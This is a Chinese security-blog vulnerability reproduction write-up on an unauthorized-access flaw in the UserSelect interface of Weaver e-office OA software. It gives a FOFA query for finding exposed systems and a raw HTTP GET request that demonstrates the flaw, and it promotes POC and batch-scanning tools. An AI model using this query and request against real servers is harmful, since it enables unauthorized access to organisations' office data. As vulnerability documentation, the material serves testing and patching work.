---
source: "gelusus/wxvl 公众号漏洞文库"
---

#  泛微e-office系统UserSelect接口存在未授权访问漏洞   
南风徐来  南风漏洞复现文库   2024-04-22 21:50  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 泛微e-office系统简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
泛微e-office系统是标准、易用、快速部署上线的专业协同OA软件,国内协同OA办公领域领导品牌,致力于为企业用户提供专业OA办公系统、移动OA应用等协同OA整体解决方案。  
## 2.漏洞描述  
  
泛微e-office系统是标准、易用、快速部署上线的专业协同OA软件。泛微 E-Office 9.5版本存在代码问题漏洞，泛微e-office系统UserSelect接口存在未授权访问漏洞。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
泛微 E-Office  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YdWDC19MibDv1IdyrfNIxZtszLHYVrnhcXic0cCGXibD2OEGjaAyfSWSOpJhecoGeD4hXEhlALtRxkQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
泛微e-office系统UserSelect接口存在未授权访问漏洞  
## 4.fofa查询语句  
  
app="泛微-EOffice"  
## 5.漏洞复现  
  
漏洞链接：http://127.0.0.1/UserSelect/  
  
漏洞数据包：  
```
GET /UserSelect/ HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YdWDC19MibDv1IdyrfNIxZt47xsK2tsa1TIsvka5t6GusYfoOmYRFmme16ZID3S4T6d9GHGg3AWdw/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
关注公众号 南风漏洞复现文库 并回复 漏洞复现129 即可获得该POC工具下载地址：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YdWDC19MibDv1IdyrfNIxZtNBWA0LpOWbnGmiaQYIuZDWwoqQic35miaiae4AaABc4wWhyS0LPvnspeEA/640?wx_fmt=jpeg&from=appmsg "null")  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YdWDC19MibDv1IdyrfNIxZtPdKHEmMoAgYySNia6B3Ksh5m0ibf3ms3bnLEzm5YMmFSxhrE862Y6Rcw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YdWDC19MibDv1IdyrfNIxZtcsK0xRL7OgiaviciaDpI2mAbqpiboQdLYf7icX9P8bmPhOla0flJscPkicBg/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YdWDC19MibDv1IdyrfNIxZt0Ch7m0d1QPReibquoRtUBBWiapnwrsq5IhiaVgBZB1mOHbu6Guu8xC8ibw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YdWDC19MibDv1IdyrfNIxZt1VXFPiaUX5nGkIaWl8k8ruWpXYK7gT6P9hQwNibnaNQaAXwNlfib4bMtQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YdWDC19MibDv1IdyrfNIxZtaUtXanLuXJ2ecSeFcBiabIrg0icicKFF62knk2XkUaQnI8uyPZgO1c6ibA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YdWDC19MibDv1IdyrfNIxZtLsR4ylt6oybHA8zRb0bPrODC5L95SUKFkZVhbplS4ZksGIIDoa0Bfg/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
请关注官网更新补丁: https://www.e-office.cn/  
## 8.往期回顾  
  
[用友U8-Cloud api/hr接口存在SQL注入漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486294&idx=1&sn=170fb1b72f2e33077f59120ee9ed73af&chksm=974b8651a03c0f476adbb39a43acef98e0aa994f35d091b9416e1376d98625182866b60f15c4&scene=21#wechat_redirect)  
  
  
[时空智友企业流程化管控系统formservice存在SQL注入漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486294&idx=2&sn=b90cb034d55c1f6a53708dc904f5c00c&chksm=974b8651a03c0f4756f06ef278357fcac5fd852c5cfd093957d18c5222194fa2861dd26a566e&scene=21#wechat_redirect)  
  
  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
